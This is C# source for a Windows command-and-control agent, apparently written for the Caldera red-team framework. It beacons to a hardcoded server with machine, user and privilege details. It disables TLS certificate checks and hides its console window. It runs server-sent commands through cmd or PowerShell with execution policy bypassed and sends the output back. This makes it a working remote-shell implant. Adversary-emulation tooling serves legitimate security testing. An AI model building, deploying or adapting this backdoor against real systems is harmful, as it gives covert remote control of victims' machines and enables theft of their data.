using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;

class Agent
{
    static string server = "https://192.168.124.133";
    static string group = "red";
    static string paw = null;  // Will be set to exe name without extension
    static string platform = "windows";
    static string executors = "cmd,psh,pwsh";
    static int sleep = 5;
    static string logFile = "debug.log";

    static void Log(string msg)
    {
        File.AppendAllText(logFile, DateTime.Now.ToString("HH:mm:ss") + " " + msg + "\n");
    }

    static void Main(string[] args)
    {
        // Log all received arguments
        Log("Total args: " + args.Length);
        for (int i = 0; i < args.Length; i++)
        {
            Log("  arg[" + i + "] = '" + args[i] + "'");
        }
        
        // Parse command line arguments
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "-server" && i + 1 < args.Length)
            {
                server = args[++i];
                Log("Parsed -server: " + server);
            }
            else if (args[i] == "-group" && i + 1 < args.Length)
            {
                group = args[++i];
                Log("Parsed -group: " + group);
            }
            else if (args[i] == "-sleep" && i + 1 < args.Length)
            {
                int.TryParse(args[++i], out sleep);
                Log("Parsed -sleep: " + sleep);
            }
        }

        // PAW = exe name without extension (simple and immutable)
        paw = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName);
        Log("PAW set to exe name: " + paw);
        
        Log("Agent starting with server=" + server);
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        Log("TLS configured");
        
        try { Console.WindowHeight = 1; Console.WindowWidth = 1; } catch {}
        Log("Console hidden");
        
        while (true)
        {
            try
            {
                Log("Loop iteration - paw=" + (paw ?? "null"));
                Beacon();
                Thread.Sleep(sleep * 1000);
            }
            catch (Exception ex)
            { 
                Log("ERROR: " + ex.Message);
                Log("Stack: " + ex.StackTrace);
                Thread.Sleep(30000);
            }
        }
    }

    static void Beacon()
    {
        var proc = Process.GetCurrentProcess();
        
        // PAW = exe name without extension (always sent, never changes)
        var json = "{" +
            $"\"platform\":\"windows\"," +
            $"\"server\":\"{server}\"," +
            $"\"group\":\"{group}\"," +
            $"\"host\":\"{Environment.MachineName}\"," +
            $"\"contact\":\"HTTP\"," +
            $"\"architecture\":\"{(Environment.Is64BitOperatingSystem ? "x64" : "x86")}\"," +
            $"\"executors\":[\"cmd\",\"psh\",\"pwsh\"]," +
            $"\"privilege\":\"{(IsAdmin() ? "Elevated" : "User")}\"," +
            $"\"username\":\"{Environment.UserName}\"," +
            $"\"location\":\"{Escape(proc.MainModule.FileName)}\"," +
            $"\"pid\":\"{proc.Id}\"," +
            $"\"ppid\":\"0\"," +
            $"\"exe_name\":\"{Path.GetFileName(proc.MainModule.FileName)}\"," +
            $"\"paw\":\"{paw}\"" +
            "}";
        
        Log("[BEACON] Beacon with PAW: " + paw);
        Log("JSON: " + json);
        byte[] data = Encoding.UTF8.GetBytes(json);
        
        var response = Post($"/beacon?paw={paw ?? ""}", data);
        
        if (!string.IsNullOrEmpty(response))
        {
            Log("[BEACON] Received response, length: " + response.Length);
            Log("[BEACON] Response preview: " + response.Substring(0, Math.Min(200, response.Length)));
            var beacon = Decode(response);
            Log($"[BEACON] Decoded {beacon.Count} fields from response");
            
            // Log all received fields
            foreach (var kvp in beacon)
            {
                var valuePreview = kvp.Value.Length > 50 ? kvp.Value.Substring(0, 50) + "..." : kvp.Value;
                Log($"[BEACON] Field: {kvp.Key} = {valuePreview}");
            }
            
            // PAW is fixed (exe name) - just confirm server acknowledged it
            if (beacon.ContainsKey("paw"))
            {
                Log("[BEACON] Server confirmed PAW: " + beacon["paw"]);
            }
            
            // Update sleep if provided
            if (beacon.ContainsKey("sleep"))
            {
                int.TryParse(beacon["sleep"], out sleep);
                Log("Sleep updated: " + sleep);
            }
            
            // Execute instructions if any
            if (beacon.ContainsKey("instructions"))
            {
                var instructionsJson = beacon["instructions"];
                Log("[BEACON] Instructions field length: " + instructionsJson.Length);
                if (instructionsJson != "[]" && instructionsJson.Length > 2)
                {
                    Log("[BEACON] *** GOT INSTRUCTIONS - executing now ***");
                    Log("[BEACON] Instructions preview: " + instructionsJson.Substring(0, Math.Min(200, instructionsJson.Length)));
                    ExecuteInstructions(instructionsJson);
                    Log("[BEACON] *** INSTRUCTIONS COMPLETED ***");
                }
                else
                {
                    Log("[BEACON] No instructions to execute (empty or [])");
                }
            }
            else
            {
                Log("[BEACON] No 'instructions' field in response");
            }
        }
    }

    static void ExecuteInstructions(string instructionsJson)
    {
        try
        {
            Log("ExecuteInstructions called, length: " + instructionsJson.Length);
            
            // Caldera sends instructions as a JSON-serialized string within JSON
            // Format: "[{\"id\":\"...\",\"command\":\"...\"}]" or "[]"
            if (instructionsJson == "[]" || instructionsJson.Length < 3)
            {
                Log("Empty instructions");
                return;
            }
            
            // Step 1: Remove outer array brackets
            var content = instructionsJson.Trim();
            if (content.StartsWith("[")) content = content.Substring(1);
            if (content.EndsWith("]")) content = content.Substring(0, content.Length - 1);
            content = content.Trim();
            
            Log("After removing brackets: " + content.Substring(0, Math.Min(150, content.Length)));
            
            // Step 2: Unescape - Caldera sends heavily escaped JSON
            // Multiple passes to handle \\\\ -> \\ -> nothing and \\\" -> \" -> "
            
            // First check if wrapped in outer quotes
            if (content.StartsWith("\"") && content.EndsWith("\""))
            {
                content = content.Substring(1, content.Length - 2);
            }
            
            // Multiple unescape passes to handle triple-escaping
            // \{\\\id\\\: -> {\"id\":
            for (int i = 0; i < 3; i++)
            {
                content = content.Replace("\\\\\\", "\\").Replace("\\\"", "\"");
            }
            
            // Final cleanup - remove any remaining single backslashes before braces/colons
            content = content.Replace("\\{", "{").Replace("\\}", "}").Replace("\\:", ":");
            
            Log("After unescape: " + content.Substring(0, Math.Min(150, content.Length)));
            
            // Step 3: Now content should be a proper JSON object like {"id":"...","command":"...",...}
            // Extract fields using simple string search
            var id = ExtractJsonValue(content, "id");
            var commandB64 = ExtractJsonValue(content, "command");
            var executor = ExtractJsonValue(content, "executor");
            
            Log($"Parsed: id={id.Substring(0, Math.Min(20, id.Length))}, cmd={commandB64.Substring(0, Math.Min(30, commandB64.Length))}, exec={executor}");
            
            if (!string.IsNullOrEmpty(id) && !string.IsNullOrEmpty(commandB64) && !string.IsNullOrEmpty(executor))
            {
                Log($"Executing instruction {id} with {executor}");
                
                // Decode base64 command
                var commandBytes = Convert.FromBase64String(commandB64);
                var command = Encoding.UTF8.GetString(commandBytes);
                Log($"Command: {command}");
                
                string output = "";
                if (executor == "psh" || executor == "pwsh")
                {
                    output = RunPowerShell(command);
                }
                else
                {
                    output = RunCmd(command);
                }
                
                Log($"Output length: {output.Length}");
                
                // Send results back
                SendResults(id, output);
            }
            else
            {
                Log("Failed to extract id/command/executor");
            }
        }
        catch (Exception ex)
        {
            Log("Execute error: " + ex.Message);
            Log("Stack: " + ex.StackTrace);
        }
    }
    
    static string ExtractJsonValue(string json, string key)
    {
        // Caldera uses non-standard format: \key: \value\, (not "key":"value")
        // Example: \id: \90d1a4d7-f957-4f5a-b891-12530ae3795b\,
        try
        {
            var searchFor = "\\" + key + ":";
            var startIdx = json.IndexOf(searchFor);
            if (startIdx == -1) return "";
            
            startIdx += searchFor.Length;
            // Skip whitespace
            while (startIdx < json.Length && (json[startIdx] == ' ' || json[startIdx] == '\t')) startIdx++;
            
            // Expect backslash before value
            if (startIdx >= json.Length || json[startIdx] != '\\') return "";
            startIdx++; // Skip opening backslash
            
            // Find closing backslash (value ends with \, or \} or end of string)
            var endIdx = startIdx;
            while (endIdx < json.Length)
            {
                if (json[endIdx] == '\\')
                    break;
                endIdx++;
            }
            
            if (endIdx >= json.Length) return "";
            
            return json.Substring(startIdx, endIdx - startIdx);
        }
        catch
        {
            return "";
        }
    }

    static void SendResults(string id, string output)
    {
        try
        {
            Log("[RESULTS] Preparing to send results for link: " + id);
            Log("[RESULTS] Output length: " + output.Length + " bytes");
            var outputB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
            Log("[RESULTS] Base64 output length: " + outputB64.Length);
            var results = "{\"paw\":\"" + paw + "\",\"results\":[{" +
                "\"id\":\"" + id + "\"," +
                "\"output\":\"" + outputB64 + "\"," +
                "\"stderr\":\"\"," +
                "\"exit_code\":0," +
                "\"status\":0," +
                "\"pid\":0" +
                "}]}";
            Log("[RESULTS] JSON structure: {paw:" + paw + ", results:[{id:" + id.Substring(0,8) + "..., output:(" + outputB64.Length + "bytes)}]}");
            Log("[RESULTS] Posting to /beacon?paw=" + paw);
            var response = Post($"/beacon?paw={paw}", Encoding.UTF8.GetBytes(results));
            Log("[RESULTS] Server accepted results, response: " + (response.Length > 0 ? "OK (" + response.Length + " bytes)" : "EMPTY"));
        }
        catch (Exception ex)
        {
            Log("[RESULTS] ERROR: " + ex.Message);
            Log("[RESULTS] STACK: " + ex.StackTrace);
        }
    }

    static void Execute(Dictionary<string, string> instructions)
    {
        foreach (var instruction in instructions)
        {
            var id = instruction.Key;
            var command = instruction.Value;
            
            string output = "";
            try
            {
                if (command.StartsWith("psh "))
                {
                    output = RunPowerShell(command.Substring(4));
                }
                else
                {
                    output = RunCmd(command);
                }
            }
            catch (Exception ex)
            {
                output = ex.Message;
            }

            var results = new Dictionary<string, string> { [id] = output };
            Post($"/results?paw={paw}", Encode(results));
        }
    }

    static string RunCmd(string command)
    {
        var proc = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            }
        };
        proc.Start();
        var output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
        proc.WaitForExit();
        return output;
    }

    static string RunPowerShell(string command)
    {
        var proc = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + command,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            }
        };
        proc.Start();
        var output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
        proc.WaitForExit();
        return output;
    }

    static string Post(string endpoint, byte[] data)
    {
        try
        {
            Log("POST " + server + endpoint);
            var client = new WebClient();
            client.Headers[HttpRequestHeader.ContentType] = "application/json";
            
            // Caldera expects base64-encoded data
            var b64data = Convert.ToBase64String(data);
            Log("Sending B64: " + b64data.Substring(0, Math.Min(100, b64data.Length)) + "...");
            var b64bytes = Encoding.UTF8.GetBytes(b64data);
            
            var response = client.UploadData(server + endpoint, "POST", b64bytes);
            var responseStr = Encoding.UTF8.GetString(response);
            Log("Response B64: " + responseStr.Substring(0, Math.Min(100, responseStr.Length)) + "...");
            
            // Decode base64 response
            var decodedBytes = Convert.FromBase64String(responseStr);
            return Encoding.UTF8.GetString(decodedBytes);
        }
        catch (Exception ex)
        {
            Log("POST ERROR: " + ex.Message);
            return null;
        }
    }

    static byte[] Encode(Dictionary<string, string> data)
    {
        var json = "{";
        var first = true;
        foreach (var kvp in data)
        {
            if (!first) json += ",";
            json += $"\"{kvp.Key}\":\"{Escape(kvp.Value)}\"";
            first = false;
        }
        json += "}";
        Log("JSON: " + json);
        return Encoding.UTF8.GetBytes(json);
    }

    static Dictionary<string, string> Decode(string json)
    {
        var result = new Dictionary<string, string>();
        json = json.Trim();
        if (string.IsNullOrEmpty(json) || json == "{}") return result;
        
        // Remove outer braces
        json = json.Substring(1, json.Length - 2).Trim();
        
        // Split by comma outside quotes
        var inQuote = false;
        var pairs = new System.Collections.Generic.List<string>();
        var current = "";
        
        for (int i = 0; i < json.Length; i++)
        {
            var c = json[i];
            if (c == '"' && (i == 0 || json[i-1] != '\\')) inQuote = !inQuote;
            else if (c == ',' && !inQuote)
            {
                pairs.Add(current.Trim());
                current = "";
                continue;
            }
            current += c;
        }
        if (!string.IsNullOrEmpty(current)) pairs.Add(current.Trim());
        
        // Parse each key:value pair
        foreach (var pair in pairs)
        {
            var colonIdx = pair.IndexOf(':');
            if (colonIdx > 0)
            {
                var key = pair.Substring(0, colonIdx).Trim().Replace("\"", "");
                var value = pair.Substring(colonIdx + 1).Trim().Replace("\"", "");
                result[key] = value;
                Log($"Decoded: {key} = {value}");
            }
        }
        
        return result;
    }

    static string Escape(string s)
    {
        return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
    }

    static bool IsAdmin()
    {
        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
        var principal = new System.Security.Principal.WindowsPrincipal(identity);
        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }
}
